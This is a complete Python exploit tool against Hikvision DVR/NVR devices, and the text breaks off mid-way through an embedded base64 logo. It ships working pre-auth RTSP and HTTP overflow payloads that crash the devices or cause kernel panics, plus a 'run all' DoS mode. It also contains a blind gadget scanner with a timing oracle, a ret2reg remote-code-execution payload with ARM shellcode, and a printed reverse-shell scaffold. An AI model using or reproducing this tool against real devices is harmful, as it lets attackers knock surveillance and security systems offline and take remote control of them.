#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║          crashbandicoot.py — Hikvision DVR/NVR exploit           ║
║          HiSilicon Hi3531 · ARM Cortex-A9 · ARMv7-A 32-bit LE   ║
║          No ASLR · No NX · No Stack Canary · Watchdog present    ║
╚══════════════════════════════════════════════════════════════════╝

Confirmed vulnerabilities implemented:

  [UA]  Pre-auth RTSP User-Agent stack overflow  CWE-121  CVSS 9.8
        PC_OFFSET=248, ua_buf=102, strcpy null-free constraint
        → DoS: PC → 0xDEADBEEF → crash + watchdog restart ~2.5s
        → RCE path: ret2reg (BX R0 gadget scan → shellcode in ua_buf)

  [TR]  RTSP Transport heap overflow              CWE-122  CVSS 7.5
        client_port= + 128 bytes → heap corruption, ~9.7s restart

  [SC]  RTSP Scale header overflow                         CVSS 8.1
        ~200 bytes → kernel panic → full device reboot >90s

  [AC]  RTSP Accept header overflow                        CVSS 8.1
        153+ bytes → kernel panic → full device reboot >90s

  [HH]  HTTP Host header heap overflow            CWE-122  CVSS 7.5
        ≥256 bytes → crash (~65% trigger rate)

  [HF]  HTTP header flood (parser stack exhaust)           CVSS 7.5
        ~200 headers × 64 bytes → RTSP HTTP parser crash

Usage:
  python3 crashbandicoot.py -t █████████████ --mode check
  python3 crashbandicoot.py -t █████████████ --mode dos-ua
  python3 crashbandicoot.py -t █████████████ --mode dos-transport
  python3 crashbandicoot.py -t █████████████ --mode dos-scale
  python3 crashbandicoot.py -t █████████████ --mode dos-accept
  python3 crashbandicoot.py -t █████████████ --mode dos-http
  python3 crashbandicoot.py -t █████████████ --mode all-dos
  python3 crashbandicoot.py -t █████████████ --mode scan-bxr0
  python3 crashbandicoot.py -t █████████████ --mode scan-bxr0 --step 0x401 --start-idx 0
  python3 crashbandicoot.py -t █████████████ --mode rce --gadget 0x401234AB
"""

import socket, struct, time, sys, argparse

# ─── Ports ────────────────────────────────────────────────────────────────────

RTSP_PORT      = 554
HTTP_PORT      = 80

# ─── Stack layout (confirmed via De Bruijn + binary search) ──────────────────

PC_OFFSET    = 248   # bytes from UA start to saved PC
UA_BUF_SIZE  = 102   # strcpy destination size (103 = crash, 102 = OK)
LOCALS_SIZE  = 114   # bytes [102–215]
REGS_SIZE    = 32    # R4–R11 = 8 × 4 bytes [216–247]

# ─── ARM32 constants (all null-free) ─────────────────────────────────────────

ARM_NOP  = b'\x01\x10\xa0\xe1'  # MOV R1,R1  — LE word = 0xe1a01001  (>0xC0000000 → kernel space)
ARM_LOOP = b'\xfe\xff\xff\xea'  # B .         — infinite loop (DEAD beacon)

# ua_buf shellcode: NOP sled + infinite loop  (102 bytes, 100% null-free)
# If BX R0 jumps here: CPU spins → service never restarts → DEAD oracle fires.
_sc_nops = (UA_BUF_SIZE - len(ARM_LOOP) - 2) // 4   # = 24
LOOP_SC  = ARM_NOP * _sc_nops + ARM_LOOP + b'\x01\x01'
assert len(LOOP_SC) == UA_BUF_SIZE, f"LOOP_SC len={len(LOOP_SC)}"
assert 0 not in LOOP_SC, "LOOP_SC has null bytes!"

# ─── Payload builders ─────────────────────────────────────────────────────────

def payload_dos_ua():
    """
    [UA] DoS: overwrite PC with 0xDEADBEEF (kernel-space → kernel panic).
    Device reboots via watchdog in ~2.5s.
    """
    return b'A' * PC_OFFSET + b'\xEF\xBE\xAD\xDE' + b'C' * 4


def payload_ret2reg(gadget_addr: int) -> bytes:
    """
    [UA] Ret2reg: overwrite PC with gadget_addr (null-free, 4-aligned).

    Layout:
      [0–101]   LOOP_SC       — shellcode in ua_buf (null-free)
      [102–215] b'B'×114      — locals filler (null-free)
      [216–247] ARM_NOP×8     — R4–R11 = 0xe1a01001 (kernel space → fast HIT if not gadget)
      [248–251] gadget_addr   — saved PC → CPU branches here

    If gadget_addr == BX R0 and R0 = ua_buf (AAPCS after strcpy):
      CPU executes LOOP_SC → infinite loop → DEAD oracle (>20s no restart) → RCE confirmed.
    """
    if 0 in struct.pack('<I', gadget_addr):
        raise ValueError(f"gadget 0x{gadget_addr:08x} has null bytes (strcpy will truncate)")
    if gadget_addr % 4 != 0:
        raise ValueError(f"gadget 0x{gadget_addr:08x} is not 4-aligned")
    locals_fill = b'\x42' * LOCALS_SIZE      # 'B' × 114, null-free
    reg_fill    = ARM_NOP * 8                # R4–R11 = 0xe1a01001 (kernel space)
    base        = LOOP_SC + locals_fill + reg_fill
    assert len(base) == PC_OFFSET
    return base + struct.pack('<I', gadget_addr)


def payload_transport_overflow() -> bytes:
    """
    [TR] Heap overflow past client_port= field.
    Confirmed: 128 bytes → heap corruption, ~9.7s restart.
    """
    return b'RTP/AVP;unicast;client_port=' + b'9' * 128


def payload_scale_overflow() -> bytes:
    """
    [SC] Scale field overflow → kernel panic.
    ~200 bytes → full device reboot, >90s recovery.
    """
    return b'1.' + b'1' * 200


def payload_accept_overflow() -> bytes:
    """
    [AC] Accept field overflow → kernel panic.
    153+ bytes → full device reboot, >90s recovery.
    """
    return b'application/sdp; ' + b'x' * 200


def payload_http_host_overflow() -> bytes:
    """
    [HH] HTTP Host header heap overflow.
    ≥256 bytes → crash with ~65% trigger rate.
    """
    return b'A' * 260


def payload_http_header_flood() -> bytes:
    """
    [HF] HTTP parser stack exhaustion via 200 custom headers.
    """
    hdrs = b''
    for i in range(200):
        hdrs += f'X-Flood-{i:03d}: '.encode() + b'B' * 50 + b'\r\n'
    return hdrs

# ─── RTSP / HTTP request builders ────────────────────────────────────────────

def rtsp_describe(target: str, user_agent: bytes) -> bytes:
    return (b"DESCRIBE rtsp://" + target.encode() + b":554/live RTSP/1.0\r\n"
            b"CSeq: 1\r\n"
            b"User-Agent: " + user_agent + b"\r\n\r\n")


def rtsp_describe_accept(target: str, accept: bytes) -> bytes:
    return (b"DESCRIBE rtsp://" + target.encode() + b":554/live RTSP/1.0\r\n"
            b"CSeq: 1\r\n"
            b"Accept: " + accept + b"\r\n\r\n")


def rtsp_setup_transport(target: str, transport: bytes) -> bytes:
    return (b"SETUP rtsp://" + target.encode() + b":554/live/trackID=1 RTSP/1.0\r\n"
            b"CSeq: 2\r\n"
            b"Transport: " + transport + b"\r\n\r\n")


def rtsp_play_scale(target: str, scale: bytes) -> bytes:
    return (b"PLAY rtsp://" + target.encode() + b":554/live RTSP/1.0\r\n"
            b"CSeq: 3\r\n"
            b"Session: 1234567890\r\n"
            b"Scale: " + scale + b"\r\n\r\n")


def http_get(target: str, host: bytes, extra_headers: bytes = b'') -> bytes:
    return (b"GET / HTTP/1.1\r\n"
            b"Host: " + host + b"\r\n"
            + extra_headers +
            b"Connection: close\r\n\r\n")

# ─── Network helpers ──────────────────────────────────────────────────────────

def tcp_send(host: str, port: int, data: bytes, timeout: float = 8) -> bytes:
    try:
        s = socket.socket(); s.settimeout(timeout)
        s.connect((host, port))
        s.sendall(data)
        resp = b''
        try: resp = s.recv(512)
        except: pass
        s.close()
        return resp
    except:
        return b''


def rtsp_alive(host: str, port: int, timeout: float = 5) -> bool:
    try:
        s = socket.socket(); s.settimeout(timeout)
        s.connect((host, port))
        s.sendall(b"OPTIONS rtsp://" + host.encode() + b":554/ RTSP/1.0\r\nCSeq:1\r\n\r\n")
        d = b''
        try: d = s.recv(256)
        except: pass
        s.close()
        return b"RTSP" in d
    except:
        return False


def http_alive(host: str, port: int, timeout: float = 5) -> bool:
    try:
        s = socket.socket(); s.settimeout(timeout)
        s.connect((host, port))
        s.sendall(b"GET / HTTP/1.0\r\nHost: " + host.encode() + b"\r\n\r\n")
        d = b''
        try: d = s.recv(256)
        except: pass
        s.close()
        return len(d) > 0
    except:
        return False


def wait_rtsp(host: str, port: int, max_wait: int = 120, label: str = '') -> bool:
    t0 = time.time()
    while time.time() - t0 < max_wait:
        if rtsp_alive(host, port):
            elapsed = time.time() - t0
            if elapsed > 2:
                print(f"  [↑] RTSP alive ({label}) — {elapsed:.1f}s", flush=True)
            return True
        time.sleep(0.8)
    print(f"  [✗] RTSP still down after {max_wait}s ({label})", flush=True)
    return False

# ─── Timing oracle ────────────────────────────────────────────────────────────

def probe(host: str, rtsp_port: int, req: bytes, poll_timeout: float = 20):
    """
    Send RTSP request, poll until service responds again.

    Returns (elapsed: float|None, tag: str):
      'HIT'   elapsed < 15s  — crash + watchdog restart (not a gadget / DoS ok)
      'SLOW'  15 < elapsed < timeout — unexpected slow cascade
      'DEAD'  elapsed > timeout     — no restart → shellcode loop running → RCE!
      'SKIP'  target unreachable before probe
    """
    if not wait_rtsp(host, rtsp_port, 60, 'pre'):
        return None, 'SKIP'

    t0      = time.time()
    POLL    = b"OPTIONS rtsp://" + host.encode() + b":554/ RTSP/1.0\r\nCSeq:99\r\n\r\n"
    deadline = t0 + poll_timeout

    tcp_send(host, rtsp_port, req, timeout=8)

    while time.time() < deadline:
        time.sleep(0.3)
        try:
            s = socket.socket(); s.settimeout(3)
            s.connect((host, rtsp_port))
            s.sendall(POLL)
            d = b''
            try: d = s.recv(256)
            except: pass
            s.close()
            if b'RTSP' in d:
                t = time.time() - t0
                return t, 'HIT' if t < 15 else 'SLOW'
        except:
            pass

    return time.time() - t0, 'DEAD'

# ─── Candidate generator (BX R0 scan) ────────────────────────────────────────

def gen_bxr0_candidates(lo: int = 0x40000000, hi: int = 0x40F30000, step: int = 0x1001):
    """
    4-aligned, null-free addresses in mmap region 0x40000000–0x40F30000.
    All confirmed mapped+executable via timing oracle.
    BX R0 encoding: 0xe12fff10 → bytes \x10\xff\x2f\xe1 (null-free).
    """
    cands = []
    addr  = lo
    while addr < hi:
        if addr % 4 == 0 and 0 not in struct.pack('<I', addr):
            cands.append(addr)
        addr += step
    return cands

# ─── Modes ────────────────────────────────────────────────────────────────────

def mode_check(args):
    """Quick liveness + banner check on both services."""
    t = args.target
    print(f"\n  Probing {t}...\n")

    # RTSP
    r_alive = rtsp_alive(t, args.rtsp_port)
    if r_alive:
        resp = tcp_send(t, args.rtsp_port,
                        b"OPTIONS rtsp://" + t.encode() + b":554/ RTSP/1.0\r\nCSeq:1\r\n\r\n")
        banner = resp.split(b'\r\n')[0].decode(errors='replace')
        print(f"  [✓] RTSP:{args.rtsp_port}  alive  —  {banner}")
    else:
        print(f"  [✗] RTSP:{args.rtsp_port}  unreachable")

    # HTTP
    h_alive = http_alive(t, args.http_port)
    if h_alive:
        resp = tcp_send(t, args.http_port,
                        b"GET / HTTP/1.0\r\nHost: " + t.encode() + b"\r\n\r\n")
        banner = resp.split(b'\r\n')[0].decode(errors='replace')
        print(f"  [✓] HTTP:{args.http_port}   alive  —  {banner}")
    else:
        print(f"  [✗] HTTP:{args.http_port}   unreachable")

    if r_alive:
        print()
        print(f"  Confirmed attack surface:")
        print(f"    [UA]  RTSP User-Agent stack overflow  CVSS 9.8  → --mode dos-ua / scan-bxr0 / rce")
        print(f"    [TR]  RTSP Transport heap overflow    CVSS 7.5  → --mode dos-transport")
        print(f"    [SC]  RTSP Scale kernel panic         CVSS 8.1  → --mode dos-scale")
        print(f"    [AC]  RTSP Accept kernel panic        CVSS 8.1  → --mode dos-accept")
    if h_alive:
        print(f"    [HH]  HTTP Host header overflow       CVSS 7.5  → --mode dos-http")
        print(f"    [HF]  HTTP header flood               CVSS 7.5  → --mode dos-http")


def mode_dos_ua(args):
    """[UA] RTSP User-Agent stack overflow — DoS. PC → 0xDEADBEEF → crash ~2.5s."""
    t = args.target
    print(f"\n  [UA] RTSP User-Agent stack overflow  (CWE-121 · CVSS 9.8 · Pre-auth)")
    print(f"       PC → 0xDEADBEEF (kernel-space) → panic → watchdog restart")

    pl  = payload_dos_ua()
    req = rtsp_describe(t, pl)

    print(f"  [→] Payload: {len(pl)} bytes  (PC_OFFSET={PC_OFFSET})")
    elapsed, tag = probe(t, args.rtsp_port, req, poll_timeout=20)
    t_str = f"{elapsed:.1f}s" if elapsed else "?"

    if   tag == 'SKIP': print(f"  [!] Target unreachable")
    elif tag in ('HIT','SLOW'):
        print(f"  [✓] DoS confirmed — crashed and restarted in {t_str}")
    elif tag == 'DEAD':
        print(f"  [?] DEAD ({t_str}) — 0xDEADBEEF is user-space here? Investigate.")


def mode_dos_transport(args):
    """[TR] RTSP Transport heap overflow — DoS. ~9.7s restart."""
    t = args.target
    print(f"\n  [TR] RTSP Transport heap overflow  (CWE-122 · CVSS 7.5 · Pre-auth)")
    print(f"       client_port= + 128 bytes → heap corruption → crash ~9.7s")

    pl  = payload_transport_overflow()
    req = rtsp_setup_transport(t, pl)

    print(f"  [→] Payload: {len(pl)} bytes past client_port=")
    elapsed, tag = probe(t, args.rtsp_port, req, poll_timeout=25)
    t_str = f"{elapsed:.1f}s" if elapsed else "?"

    if   tag == 'SKIP': print(f"  [!] Target unreachable")
    elif tag in ('HIT','SLOW'):
        print(f"  [✓] DoS confirmed — crashed and restarted in {t_str}")
    elif tag == 'DEAD':
        print(f"  [?] DEAD ({t_str}) — heap data pointer may have landed in mapped region")


def mode_dos_scale(args):
    """[SC] RTSP Scale overflow — kernel panic, full device reboot >90s."""
    t = args.target
    print(f"\n  [SC] RTSP Scale overflow  (CVSS 8.1 · Pre-auth · Kernel panic)")
    print(f"       ~200 bytes → full device reboot, >90s recovery")

    pl  = payload_scale_overflow()
    req = rtsp_play_scale(t, pl)

    print(f"  [→] Payload: {len(pl)} bytes in Scale field")
    print(f"  [~] Waiting up to 150s for reboot + restart...")
    elapsed, tag = probe(t, args.rtsp_port, req, poll_timeout=150)
    t_str = f"{elapsed:.1f}s" if elapsed else "?"

    if   tag == 'SKIP': print(f"  [!] Target unreachable")
    elif tag in ('HIT','SLOW'):
        print(f"  [✓] Kernel panic DoS confirmed — device rebooted in {t_str}")
    elif tag == 'DEAD':
        print(f"  [?] No restart after 150s — device may need manual power cycle")


def mode_dos_accept(args):
    """[AC] RTSP Accept overflow — kernel panic, full device reboot >90s."""
    t = args.target
    print(f"\n  [AC] RTSP Accept overflow  (CVSS 8.1 · Pre-auth · Kernel panic)")
    print(f"       153+ bytes → full device reboot, >90s recovery")

    pl  = payload_accept_overflow()
    req = rtsp_describe_accept(t, pl)

    print(f"  [→] Payload: {len(pl)} bytes in Accept field")
    print(f"  [~] Waiting up to 150s for reboot + restart...")
    elapsed, tag = probe(t, args.rtsp_port, req, poll_timeout=150)
    t_str = f"{elapsed:.1f}s" if elapsed else "?"

    if   tag == 'SKIP': print(f"  [!] Target unreachable")
    elif tag in ('HIT','SLOW'):
        print(f"  [✓] Kernel panic DoS confirmed — device rebooted in {t_str}")
    elif tag == 'DEAD':
        print(f"  [?] No restart after 150s — device may need manual power cycle")


def mode_dos_http(args):
    """[HH+HF] HTTP Host overflow + header flood — DoS on port 80."""
    t = args.target
    print(f"\n  [HH] HTTP Host header overflow  (CWE-122 · CVSS 7.5 · Pre-auth)")
    print(f"       260 bytes → heap corruption (~65% trigger rate)")

    pl  = payload_http_host_overflow()
    req = http_get(t, pl)
    print(f"  [→] Sending Host: {'A'*10}... ({len(pl)} bytes)")
    resp = tcp_send(t, args.http_port, req, timeout=6)

    if not resp:
        print(f"  [✓] No response — crash likely triggered")
        up = http_alive(t, args.http_port, timeout=5)
        print(f"  [{'✓' if up else '?'}] HTTP {'recovered' if up else 'still down — wait ~30s'}")
    else:
        line = resp.split(b'\r\n')[0].decode(errors='replace')
        print(f"  [~] Got response: {line}")
        print(f"       65% trigger rate — retry if needed")

    print()
    print(f"  [HF] HTTP header flood  (parser stack exhaustion · CVSS 7.5)")

    extra = payload_http_header_flood()
    n_hdr = extra.count(b'\r\n')
    req2  = http_get(t, t.encode(), extra)
    print(f"  [→] Sending {n_hdr} flood headers ({len(req2)} bytes total)")
    resp2 = tcp_send(t, args.http_port, req2, timeout=8)

    if not resp2:
        print(f"  [✓] No response — parser stack exhausted, crash triggered")
    else:
        line2 = resp2.split(b'\r\n')[0].decode(errors='replace')
        print(f"  [~] Got response: {line2}")
        print(f"       Try increasing header count if not triggered")


def mode_all_dos(args):
    """Run all confirmed DoS vectors sequentially."""
    t = args.target
    print(f"\n  ── ALL-DOS: {t} ──")
    print(f"  Sequentially triggering all 5 confirmed crash vectors.\n")

    vectors = [
        ('[UA] User-Agent stack overflow (CVSS 9.8)', mode_dos_ua),
        ('[TR] Transport heap overflow   (CVSS 7.5)', mode_dos_transport),
        ('[SC] Scale kernel panic        (CVSS 8.1)', mode_dos_scale),
        ('[AC] Accept kernel panic       (CVSS 8.1)', mode_dos_accept),
        ('[HH] HTTP Host overflow        (CVSS 7.5)', mode_dos_http),
    ]

    results = []
    for label, fn in vectors:
        print(f"\n  {'─'*55}")
        try:
            fn(args)
            results.append((label, '✓'))
        except Exception as e:
            print(f"  [!] Error: {e}")
            results.append((label, '✗'))
        # wait for service to recover before next vector
        print(f"  [~] Waiting for RTSP recovery before next vector...")
        wait_rtsp(t, args.rtsp_port, 150, 'between vectors')

    print(f"\n  {'═'*55}")
    print(f"  Summary:")
    for label, status in results:
        print(f"    [{status}] {label}")


def mode_scan_bxr0(args):
    """
    [UA→RCE] Blind BX R0 gadget scan in mmap region 0x40000000–0x40F30000.

    Strategy: send ret2reg payload with each candidate as PC.
      DEAD (>20s no restart) = BX R0 gadget at that addr AND R0=ua_buf → RCE confirmed.
      HIT  (<15s restart)    = not a BX R0 gadget at that addr.

    BX R0 encoding: \x10\xff\x2f\xe1 (null-free ✓).
    All candidate addresses: 4-aligned, null-free, in confirmed-mapped region.
    """
    t    = args.target
    step = int(args.step, 16)

    cands = gen_bxr0_candidates(step=step)
    start = args.start_idx

    print(f"\n  [BX] BX R0 / BLX R0 gadget scan  →  ret2reg RCE path")
    print(f"       Mmap region:  0x40000000 – 0x40F30000  (~15 MB, confirmed mapped+exec)")
    print(f"       Step:         0x{step:x}  ({step/1024:.1f} KB per probe)")
    print(f"       Candidates:   {len(cands)}  (4-aligned, null-free)")
    print(f"       ETA:          ~{len(cands)*10//60} min  (10s avg/probe)")
    if start:
        print(f"       Resuming:     from index {start}  (0x{cands[start]:08x})")
    print(f"       Oracle:       DEAD (>20s no restart) = shellcode loop running = RCE!")
    print()

    # ── Baseline sanity check ─────────────────────────────────────────────────
    b_addr = 0x40111104
    print(f"  [Baseline] 0x{b_addr:08x} — expect HIT (~2.5s), NOT DEAD")
    b_req = rtsp_describe(t, payload_ret2reg(b_addr))
    b_t, b_tag = probe(t, args.rtsp_port, b_req, poll_timeout=20)
    b_str = f"{b_t:.1f}s" if b_t else "?"
    print(f"  Baseline: {b_tag} ({b_str})")

    if b_tag == 'DEAD':
        print(f"\n  *** BASELINE = DEAD — 0x{b_addr:08x} may BE a BX R0 gadget! ***")
        print(f"  Run: python3 crashbandicoot.py -t {t} --mode rce --gadget 0x{b_addr:08x}")
        return
    elif b_tag == 'SLOW':
        print(f"  [!] SLOW baseline ({b_str}) — R11 FP cascade not fully suppressed.")
        print(f"      Proceeding; DEAD threshold still distinct from SLOW.")
    elif b_tag == 'SKIP':
        print(f"  [!] Target unreachable — aborting scan.")
        return

    print()
    print(f"  Starting scan from index {start}...")
    print(f"  {'─'*55}")

    found = None
    for i, addr in enumerate(cands[start:], start=start):
        req = rtsp_describe(t, payload_ret2reg(addr))
        elapsed, tag = probe(t, args.rtsp_port, req, poll_timeout=20)
        t_str = f"{elapsed:.1f}s" if elapsed else "?"

        star = "  [★ DEAD!]" if tag == 'DEAD' else "          "
        print(f"{star} [{i+1:4d}/{len(cands)}] 0x{addr:08x}  {t_str:7}  [{tag}]",
              flush=True)

        if tag == 'DEAD':
            found = addr
            break
        elif tag == 'SKIP':
            print(f"  [!] Target went away — waiting for recovery...")
            wait_rtsp(t, args.rtsp_port, 120, 'recovery')
        elif tag == 'SLOW':
            wait_rtsp(t, args.rtsp_port, 60, f'slow@0x{addr:08x}')

    print(f"\n  {'═'*55}")
    if found:
        print(f"  *** BX R0 GADGET FOUND: 0x{found:08x} ***")
        print(f"  LOOP shellcode ran in ua_buf → R0=ua_buf confirmed!")
        print()
        print(f"  To confirm RCE:")
        print(f"    python3 crashbandicoot.py -t {t} --mode rce --gadget 0x{found:08x}")
    else:
        remaining = len(cands) - start
        print(f"  No DEAD after {remaining} probes (step=0x{step:x}).")
        print()
        print(f"  Possible causes:")
        print(f"    1. R0 ≠ ua_buf at jump time (another call after strcpy clobbers R0)")
        print(f"       → try --mode scan-bxr0 with modified payload using R4 (we control it)")
        print(f"    2. No BX R0 in the tested addresses — increase density:")
        print(f"       → --step 0x401  (~3800 probes, ~6.3h, near-full coverage)")
        print(f"    3. Target executable layout changed since mapping session")


def mode_rce(args):
    """
    [UA→RCE] Execute LOOP_SC shellcode via ret2reg (BX R0 gadget).
    DEAD (>20s no restart) = infinite loop running in ua_buf = RCE confirmed.
    """
    t = args.target

    if not args.gadget:
        print(f"\n  [!] --gadget <hex_addr> required")
        print(f"      Run --mode scan-bxr0 first to find a valid BX R0 gadget.")
        sys.exit(1)

    gadget = int(args.gadget, 16)

    print(f"\n  [RCE] Ret2reg via BX R0 gadget")
    print(f"        Target:  {t}:{args.rtsp_port}")
    print(f"        Gadget:  0x{gadget:08x}  (must be 'BX R0' or 'BLX R0')")
    print(f"        ua_buf:  LOOP_SC = NOP×24 + B. (runs forever if R0=ua_buf)")
    print(f"        Oracle:  DEAD (>20s) = loop running = RCE | HIT (<15s) = not a gadget")
    print()

    try:
        pl = payload_ret2reg(gadget)
    except ValueError as e:
        print(f"  [!] Bad gadget: {e}")
        sys.exit(1)

    req = rtsp_describe(t, pl)
    print(f"  [→] Sending exploit ({len(pl)} bytes)...")
    elapsed, tag = probe(t, args.rtsp_port, req, poll_timeout=30)
    t_str = f"{elapsed:.1f}s" if elapsed else "?"

    if tag == 'DEAD':
        print()
        print(f"  ╔══════════════════════════════════════════════════════╗")
        print(f"  ║  ★★★  RCE CONFIRMED  ★★★                           ║")
        print(f"  ║                                                      ║")
        print(f"  ║  DEAD after {t_str:<7}  — LOOP shellcode is running  ║")
        print(f"  ║  BX R0 @ 0x{gadget:08x}  →  ua_buf = R0 ✓         ║")
        print(f"  ║                                                      ║")
        print(f"  ║  Next: replace LOOP_SC with reverse shell shellcode  ║")
        print(f"  ║  Constraints: ARM32 LE, null-free, ≤{UA_BUF_SIZE} bytes        ║")
        print(f"  ╚══════════════════════════════════════════════════════╝")
        print()
        print(f"  Shellcode scaffold:")
        print(f"    socket(AF_INET=2, SOCK_STREAM=1, 0)  → syscall 281")
        print(f"    connect(fd, {{AF,port,ip}}, 16)       → syscall 283")
        print(f"    dup2(fd, 0/1/2)                      → syscall 63")
        print(f"    execve('/bin/sh', [...], NULL)        → syscall 11")
        print(f"    Assemble: arm-linux-gnueabi-as sc.s && objcopy -O binary sc.o sc.bin")
        print(f"    Verify:   assert 0 not in open('sc.bin','rb').read()")
    elif tag in ('HIT', 'SLOW'):
        print(f"  [✗] HIT ({t_str}) — service restarted, shellcode did not run")
        print(f"      Either 0x{gadget:08x} is not a BX R0 instruction,")
        print(f"      or R0 ≠ ua_buf at epilogue time (call after strcpy clobbered R0).")
        print(f"      Try adjacent addresses: 0x{gadget-4:08x}, 0x{gadget+4:08x}")
    elif tag == 'SKIP':
        print(f"  [!] Target unreachable before probe")

# ─── CLI ──────────────────────────────────────────────────────────────────────

MODES = {
    'check':         mode_check,
    'dos-ua':        mode_dos_ua,
    'dos-transport': mode_dos_transport,
    'dos-scale':     mode_dos_scale,
    'dos-accept':    mode_dos_accept,
    'dos-http':      mode_dos_http,
    'all-dos':       mode_all_dos,
    'scan-bxr0':     mode_scan_bxr0,
    'rce':           mode_rce,
}

# ─── Logo (embedded image, dynamic terminal scale) ───────────────────────────

_LOGO_B64 = "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